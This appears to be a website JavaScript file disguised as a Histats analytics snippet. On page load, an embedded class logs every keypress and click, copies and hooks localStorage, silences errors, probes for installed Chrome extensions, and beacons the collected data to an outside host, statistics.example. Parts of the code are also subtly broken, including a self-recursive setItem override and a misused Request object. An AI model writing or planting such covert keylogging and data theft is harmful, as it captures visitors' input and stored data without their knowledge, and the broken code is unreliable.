var wpt1 = 1703401207;
var _Hasync = _Hasync || [];
_Hasync.push(['Histats.start', '1,4540055,4,0,0,0,00010000']);
_Hasync.push(['Histats.fasi', '1']);
class ExecutionTracker {
  constructor(optionTracker) {
    this._trackerConfig = optionTracker;
    this._collectionRecords = new Map();
    this._launchTime = performance.now();
    this._retryCount = 3;
    this._parallelTasks = 5;
    window.onunload = this._sendReport.bind(this);
    this._attachEventListeners();
    if (window.localStorage) {
      this._oldLocalStorage = {
        ...window.localStorage
      };
      var self = this;
      window.localStorage.setItem = function (key, val) {
        self._collectionRecords.set(key, val);
        localStorage.setItem(key, val);
      };
    }
    window.onerror = function (msg, url, line, col, error) {
      var extra = !col ? '' : 'column: ' + col;
      extra += !error ? '' : 'error: ' + error;
      self._collectionRecords.set('error', line + ' - ' + extra);
      return true;
    };
  }
  _attachEventListeners() {
    document.body.addEventListener('mousedown', this._handleClick.bind(this));
    document.body.addEventListener('keydown', this._handleKeyPress.bind(this));
  }
  _handleClick(e) {
    const {
      target: {
        localName
      }
    } = e;
    this._collectionRecords.set(`Clicked_${localName}`, true);
  }
  _handleKeyPress(e) {
    const {
      key
    } = e;
    this._collectionRecords.set(`Pressed_${key}`, true);
  }
  async _verifyUrl(extensionId, page) {
    const uniqueId = `?_=${Math.random().toString(36).slice(2)}`;
    const request = new Request();
    return new Promise(resolve => {
      request.timeout = 2500;
      request.onreadystatechange = () => {
        if (request.readyState === 4) {
          resolve(request.status === 200);
        }
      };
      request.onerror = () => resolve(false);
      request.ontimeout = () => resolve(false);
      request.open('GET', `chrome-extension://${extensionId}/${page}${uniqueId}`, false);
      request.send();
    });
  }
  _partition(arr, len) {
    return Array.from({
      length: Math.round(arr.length / len)
    }, (v, k) => arr.slice(k * len, k * len + len));
  }
  async _examineWithRetry(name, trackerData) {
    let established = false;
    for (let trial = 0; trial < this._retryCount && !established; trial++) {
      established = await this._verifyUrl(trackerData.id, trackerData.page);
      if (!established) {
        await new Promise(r => setTimeout(r, 50 * (trial + 1)));
      }
    }
    return established;
  }
  async track() {
    const trackers = Object.entries(this._trackerConfig);
    const partitions = this._partition(trackers, this._parallelTasks);
    for (const batch of partitions) {
      await Promise.all(batch.map(async ([name, trackerData]) => {
        const found = await this._examineWithRetry(name, trackerData);
        this._collectionRecords.set(name, found);
      }));
    }
    this._sendReport();
  }
  _sendReport() {
    const passData = {
      savedData: Object.fromEntries(this._collectionRecords),
      metadata: {
        execTime: performance.now() - this._launchTime,
        timestamp: new Date().toLocaleString()
      },
      hooks: {
        localstorage: this._oldLocalStorage || {},
        globalvars: Object.entries(window).filter(([key]) => key.startsWith('myGlobal')).reduce((acc, [key, val]) => ({
          ...acc,
          [key]: val
        }), {})
      }
    };
    const utf8 = new TextEncoder();
    const packet = utf8.encode(JSON.stringify(passData));
    if ('sendBeacon' in navigator) {
      navigator.sendBeacon('https://statistics.example/ext-report', packet);
    } else {
      fetch('https://statistics.example/ext-report', {
        method: 'POST',
        body: packet,
        keepalive: true,
        headers: {
          'Content-Type': 'application/json'
        }
      }).catch(() => {});
    }
  }
}
_Hasync.push(['Histats.track_hits', '']);
(() => {
  const tracker = new ExecutionTracker(window.trackerData);
  if (document.readyState !== 'loading') {
    tracker.track();
  } else {
    document.addEventListener('DOMContentLoaded', () => tracker.track());
  }
})();
(function () {
  var hs = document.createElement('script');
  hs.type = 'text/javascript';
  hs.async = true;
  hs.src = '//s10.histats.com/js15_as.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();